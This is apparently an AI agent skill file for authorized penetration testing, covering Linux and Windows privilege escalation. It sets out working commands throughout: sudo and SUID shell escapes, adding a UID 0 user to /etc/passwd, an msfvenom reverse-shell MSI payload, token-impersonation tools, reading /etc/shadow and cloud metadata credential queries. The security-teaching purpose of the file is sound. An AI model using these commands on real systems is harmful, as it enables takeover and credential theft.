---
name: performing-privilege-escalation-assessment
description: >
  Performs privilege escalation assessments on compromised Linux and Windows systems to identify
  paths from low-privilege access to root or SYSTEM-level control. The tester enumerates
  misconfigurations, vulnerable services, kernel exploits, SUID binaries, unquoted service
  paths, and credential stores to demonstrate the full impact of an initial compromise.
  Activates for requests involving privilege escalation testing, local exploitation, post-compromise
  escalation, or OS-level security assessment.
domain: cybersecurity
subdomain: penetration-testing
tags: [privilege-escalation, post-exploitation, Linux-privesc, Windows-privesc, local-exploitation]
version: 1.0.0
author: mahipal
license: Apache-2.0
---
# Performing Privilege Escalation Assessment

## When to Use

- After gaining initial low-privilege access during a penetration test to demonstrate full system compromise
- Assessing the security hardening of Linux and Windows servers against local privilege escalation attacks
- Evaluating whether endpoint detection and response (EDR) tools detect common privilege escalation techniques
- Testing the effectiveness of least-privilege policies and application whitelisting on endpoints
- Validating that container breakout and VM escape controls are properly configured

**Do not use** without written authorization, against production systems where exploitation could cause downtime, or for deploying kernel exploits on systems without prior approval and rollback capability.

## Prerequisites

- Low-privilege shell access (reverse shell, SSH, RDP) to the target system obtained through authorized means
- Privilege escalation enumeration scripts: linPEAS (Linux), winPEAS (Windows), Linux Smart Enumeration (LSE)
- Compiled kernel exploits for common CVEs or access to compilation tools on the target
- GTFOBins reference for Linux SUID/sudo binary abuse and LOLBAS reference for Windows living-off-the-land binaries
- Precompiled post-exploitation binaries for the target architecture if compilation is not available on the target

## Workflow

### Step 1: System Enumeration

Gather comprehensive information about the target system:

**Linux Enumeration:**
- `id && whoami` - Current user and group memberships
- `uname -a` - Kernel version for kernel exploit identification
- `cat /etc/os-release` - Distribution and version
- `sudo -l` - Commands the current user can run as root via sudo
- `find / -perm -4000 -type f 2>/dev/null` - SUID binaries
- `find / -perm -2000 -type f 2>/dev/null` - SGID binaries
- `crontab -l && ls -la /etc/cron*` - Scheduled tasks running as root
- `ps aux | grep root` - Processes running as root
- `cat /etc/passwd` - User accounts (look for additional users with UID 0)
- `find / -writable -type d 2>/dev/null` - World-writable directories
- Run `linpeas.sh` for automated comprehensive enumeration

**Windows Enumeration:**
- `whoami /priv` - Current user privileges (look for SeImpersonatePrivilege, SeDebugPrivilege)
- `systeminfo` - OS version, hotfix level, architecture
- `wmic service get name,pathname,startmode` - Unquoted service paths
- `icacls "C:\Program Files" /T` - Writable directories in Program Files
- `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` - AlwaysInstallElevated check
- `cmdkey /list` - Stored Windows credentials
- `schtasks /query /fo LIST /v` - Scheduled tasks with their run-as accounts
- Run `winPEAS.exe` for automated comprehensive enumeration

### Step 2: Linux Privilege Escalation Vectors

Test identified escalation vectors systematically:

- **Sudo misconfigurations**: If `sudo -l` shows entries like `(ALL) NOPASSWD: /usr/bin/vim`, use GTFOBins to escalate:
  - `sudo vim -c ':!/bin/bash'` to spawn a root shell
  - Common dangerous sudo entries: vim, less, find, nmap, python, perl, ruby, awk, env
- **SUID binary abuse**: If a SUID binary is identified that allows arbitrary command execution, shell escape, or file read:
  - Custom SUID: Check if a custom SUID binary calls other programs without absolute paths (PATH injection)
  - Known SUID: Check GTFOBins for exploitation of standard SUID binaries
- **Cron job exploitation**: If a cron job runs a script writable by the current user, or runs a script from a writable directory:
  - Modify the script to add a reverse shell or SUID copy of bash
  - PATH-based cron exploitation: if the cron job calls a command without absolute path and PATH is writable
- **Kernel exploits**: Match the kernel version to known exploits:
  - DirtyPipe (CVE-2022-0847): Linux kernel 5.8-5.16.11
  - DirtyCow (CVE-2016-5195): Linux kernel 2.6.22-4.8.3
  - PwnKit (CVE-2021-4034): Polkit pkexec vulnerability affecting most Linux distributions
- **Capabilities abuse**: `getcap -r / 2>/dev/null` to find binaries with elevated capabilities (cap_setuid, cap_dac_override)
- **Writable /etc/passwd**: If /etc/passwd is writable, add a new root user: `echo 'newroot:$1$hash:0:0::/root:/bin/bash' >> /etc/passwd`

### Step 3: Windows Privilege Escalation Vectors

Test Windows-specific escalation paths:

- **Token impersonation**: If the user has `SeImpersonatePrivilege` (common for service accounts and IIS):
  - Use `JuicyPotato.exe`, `PrintSpoofer.exe`, or `GodPotato.exe` to impersonate SYSTEM
  - `PrintSpoofer.exe -i -c "cmd /c whoami"` -> `NT AUTHORITY\SYSTEM`
- **Unquoted service paths**: If a service has an unquoted path with spaces (e.g., `C:\Program Files\My App\service.exe`) and you can write to an intermediate directory:
  - Place a malicious executable at `C:\Program Files\My.exe` which will execute when the service restarts
- **Writable service binaries**: If you can modify the executable of a service running as SYSTEM:
  - Replace the binary with a reverse shell and restart the service
- **AlwaysInstallElevated**: If both HKLM and HKCU AlwaysInstallElevated registry keys are set to 1:
  - Generate a malicious MSI: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o shell.msi`
  - Install with elevated privileges: `msiexec /quiet /qn /i shell.msi`
- **Stored credentials**: Check for credentials in `cmdkey /list`, AutoLogon registry keys, unattend.xml, web.config files, and PowerShell history
- **DLL hijacking**: Identify services that load DLLs from writable directories. Use Process Monitor to find missing DLL loads, then place a malicious DLL.
- **Scheduled tasks**: Find tasks running as SYSTEM with writable scripts or binaries

### Step 4: Container and Cloud Escalation

Test for escalation paths in containerized and cloud environments:

- **Docker breakout**: Check if the container runs in privileged mode (`--privileged`), has the Docker socket mounted (`/var/run/docker.sock`), or has `SYS_ADMIN` capability
- **Kubernetes pod escalation**: Check for service account tokens with cluster-admin rights, hostPID/hostNetwork namespaces, or hostPath volume mounts
- **Cloud metadata**: Access cloud instance metadata from compromised hosts (`http://169.254.169.254/latest/meta-data/`) to discover IAM roles, credentials, and instance information
- **IAM role abuse**: If cloud credentials are discovered, enumerate IAM permissions and test for privilege escalation through IAM policy manipulation

### Step 5: Documentation and Impact Assessment

Document the complete escalation path and business impact:

- Record every command executed during escalation with timestamps
- Capture proof of elevated access (whoami showing root/SYSTEM, accessing restricted files)
- Document what data or systems become accessible at the elevated privilege level
- Map the escalation technique to MITRE ATT&CK (T1548 - Abuse Elevation Control Mechanism, T1068 - Exploitation for Privilege Escalation)
- Provide specific remediation for each identified escalation vector

## Key Concepts

| Term | Definition |
|------|------------|
| **SUID Binary** | A Linux binary with the Set User ID bit enabled, which executes with the file owner's privileges (typically root) regardless of who runs it |
| **SeImpersonatePrivilege** | A Windows privilege that allows a process to impersonate another user's security token, commonly abused by service accounts to escalate to SYSTEM |
| **Kernel Exploit** | An exploit targeting a vulnerability in the operating system kernel to gain ring-0 or root/SYSTEM-level access |
| **GTFOBins** | A curated list of Unix binaries that can be exploited for privilege escalation, file read/write, or shell escape when misconfigured |
| **LOLBAS** | Living Off The Land Binaries and Scripts; legitimate Windows binaries that can be abused for code execution, file operations, or persistence |
| **DLL Hijacking** | Exploiting the DLL search order on Windows to load a malicious DLL by placing it in a directory searched before the legitimate DLL location |
| **Token Impersonation** | A Windows technique where a compromised process with appropriate privileges captures and uses another user's access token to execute commands as that user |

## Tools & Systems

- **linPEAS / winPEAS**: Automated privilege escalation enumeration scripts that check hundreds of potential escalation vectors on Linux and Windows
- **GTFOBins / LOLBAS**: Reference databases of Unix binaries and Windows binaries that can be exploited for privilege escalation when misconfigured
- **PrintSpoofer / GodPotato**: Windows privilege escalation tools that exploit `SeImpersonatePrivilege` to achieve SYSTEM-level access from service accounts
- **Linux Exploit Suggester**: Script that compares the target kernel version against a database of known kernel exploits to identify applicable exploits

## Common Scenarios

### Scenario: Privilege Escalation on a Linux Web Server

**Context**: During a penetration test, the tester gained a low-privilege shell as `www-data` on an Ubuntu 22.04 web server through a PHP file upload vulnerability. The goal is to escalate to root to demonstrate full server compromise.

**Approach**:
1. Run `linpeas.sh` which identifies that `www-data` can run `/usr/bin/find` as root via sudo without a password
2. Verify with `sudo -l`: `(root) NOPASSWD: /usr/bin/find`
3. Consult GTFOBins for the `find` sudo entry: `sudo find . -exec /bin/bash -p \; -quit`
4. Execute the command and obtain a root shell
5. As root, access `/etc/shadow` to extract password hashes, read database credentials from the application configuration, and access the MySQL database containing customer PII
6. Document: initial access as www-data -> sudo misconfiguration -> root shell -> database access -> 75,000 customer records accessible

**Pitfalls**:
- Running kernel exploits without testing on a similar system first, risking a kernel panic and system crash
- Not checking for container environments where apparent root access may be limited to the container namespace
- Ignoring cloud metadata endpoints accessible from the compromised host that may yield IAM credentials
- Failing to enumerate capabilities and SUID binaries after checking sudo, missing alternative escalation paths

## Output Format

```
## Finding: Sudo Misconfiguration Allowing Root Escalation via find

**ID**: PRIV-001
**Severity**: Critical (CVSS 8.8)
**Affected Host**: web-prod-01 (10.10.5.15)
**OS**: Ubuntu 22.04 LTS
**Initial Access**: www-data (via PHP file upload - WEB-004)
**Escalation Technique**: MITRE ATT&CK T1548.003 - Sudo and Sudo Caching

**Description**:
The www-data user is configured in /etc/sudoers to execute /usr/bin/find as root
without a password. The find command supports the -exec flag which can spawn a
root shell, effectively granting www-data unrestricted root access.

**Proof of Concept**:
www-data@web-prod-01:~$ sudo -l
(root) NOPASSWD: /usr/bin/find
www-data@web-prod-01:~$ sudo find . -exec /bin/bash -p \; -quit
root@web-prod-01:~# id
uid=0(root) gid=0(root) groups=0(root)

**Impact**:
Full root access on the production web server. From root, the tester accessed
database credentials in /var/www/app/.env, connected to MySQL, and confirmed
read access to 75,000 customer records including names, emails, and addresses.

**Remediation**:
1. Remove the /usr/bin/find sudo entry for www-data
2. If find access is required, restrict it to specific directories with --no-exec
3. Audit all sudo entries for binaries listed in GTFOBins
4. Implement sudo logging with auditd for all privileged command execution
```
